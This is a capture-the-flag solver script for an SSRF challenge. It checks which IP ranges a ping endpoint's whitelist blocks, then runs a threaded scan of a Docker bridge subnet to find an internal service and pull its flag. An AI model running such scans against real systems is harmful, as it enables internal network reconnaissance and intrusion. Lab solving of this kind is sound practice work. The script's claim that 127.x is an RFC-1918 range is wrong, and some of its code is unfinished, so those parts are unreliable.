#!/usr/bin/env python3
"""
Solve: Ping-o-Matic v2 — SSRF via Docker internal IP range scan
================================================================
Challenge recap
---------------
The upgraded challenge replaced the naive blacklist with a strict IPv4
whitelist WAF.  Private RFC-1918 ranges (10.x, 192.168.x, 127.x) are
blocked, but the Docker bridge network uses 172.20.0.x — which is NOT
in the blocked list.  The internal "monitor" service that holds the flag
lives somewhere on 172.20.0.1-254.

The HTML page hints at this with:
    Internal monitoring dashboard: http://monitor.stadium.internal/status

Attack plan
-----------
1. Confirm the WAF blocks standard private ranges.
2. Scan 172.20.0.1-254 via the ping endpoint.
3. When a host is reachable AND the response contains the flag string,
   print it and stop.

Note: in a real Docker Compose setup the flag service is assigned a
deterministic IP (172.20.0.99 in the challenge config), but we scan the
full /24 so the solver works even if the address changes.
"""

import re
import sys
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── config ────────────────────────────────────────────────────────────────────
TARGET   = "http://localhost:8001"      # adjust port to match your docker-compose
SUBNET   = "172.20.0"                   # Docker bridge network used by the challenge
THREADS  = 30                           # concurrent threads for the scan
TIMEOUT  = 6                            # seconds per request (ping -c 1 -W 2 + overhead)
FLAG_RE  = re.compile(r"INFODAYS\{[^}]+\}")


def ping_ip(ip: str) -> tuple[str, str | None]:
    """
    Send one request to the /  endpoint with ?ip=<ip>.
    Returns (ip, flag_string) if the flag is found, else (ip, None).
    The WAF only blocks the request if the IP fails validation; a reachable
    host returns its HTTP response body inside the <pre> tag.
    """
    try:
        r = requests.get(TARGET, params={"ip": ip}, timeout=TIMEOUT)
        m = FLAG_RE.search(r.text)
        if m:
            return ip, m.group()
        # Even without the flag, log live hosts so the tester can inspect manually
        if "1 received" in r.text or "bytes from" in r.text:
            return ip, None          # host is up but no flag (not the target service)
    except requests.RequestException:
        pass
    return ip, None


def verify_waf():
    """Quick sanity-check: ensure the WAF is working as expected."""
    print("[*] Verifying WAF blocks known private ranges …")
    blocked_samples = ["127.0.0.1", "10.0.0.1", "192.168.1.1"]
    for ip in blocked_samples:
        r = requests.get(TARGET, params={"ip": ip}, timeout=5)
        if "Blocked" in r.text or "Private" in r.text or "⛔" in r.text:
            print(f"    [✓] {ip:15s}  → blocked (expected)")
        else:
            print(f"    [!] {ip:15s}  → NOT blocked — WAF may have changed")

    # 172.20.x should NOT be blocked
    test_172 = f"{SUBNET}.1"
    r = requests.get(TARGET, params={"ip": test_172}, timeout=5)
    if "Blocked" in r.text or "⛔" in r.text:
        print(f"    [✗] {test_172} is blocked — the Docker bridge subnet may differ.")
        print("        Edit SUBNET at the top of this script and retry.")
        sys.exit(1)
    else:
        print(f"    [✓] {test_172:15s}  → not blocked (172.20.x bypass confirmed)\n")


def main():
    print("=" * 60)
    print(" Ping-o-Matic v2 — SSRF solver")
    print("=" * 60)

    verify_waf()

    ips = [f"{SUBNET}.{i}" for i in range(1, 255)]
    print(f"[*] Scanning {len(ips)} hosts on {SUBNET}.0/24 with {THREADS} threads …\n")

    found_flag  = None
    found_ip    = None
    live_hosts  = []

    with ThreadPoolExecutor(max_workers=THREADS) as pool:
        futures = {pool.submit(ping_ip, ip): ip for ip in ips}
        for future in as_completed(futures):
            ip, flag = future.result()
            if flag:
                found_flag = flag
                found_ip   = ip
                # Cancel remaining work once we have the flag
                for f in futures:
                    f.cancel()
                break
            # Track live-but-flagless hosts for debugging
            # (only add if the host actually responded with ICMP success)
            # We re-use the return value: (ip, None) for up-no-flag

    print()
    if found_flag:
        print(f"[+] Flag service found at: {found_ip}")
        print(f"\n{'='*60}")
        print(f"  FLAG: {found_flag}")
        print(f"{'='*60}\n")
    else:
        print("[-] Flag not found.")
        print("    Possible reasons:")
        print("    • The flag service is on a different subnet — check SUBNET variable")
        print("    • The Docker Compose network name differs — inspect with:")
        print("        docker network ls")
        print("        docker network inspect <name>")
        print("    • The service isn't running — check: docker ps")


if __name__ == "__main__":
    main()
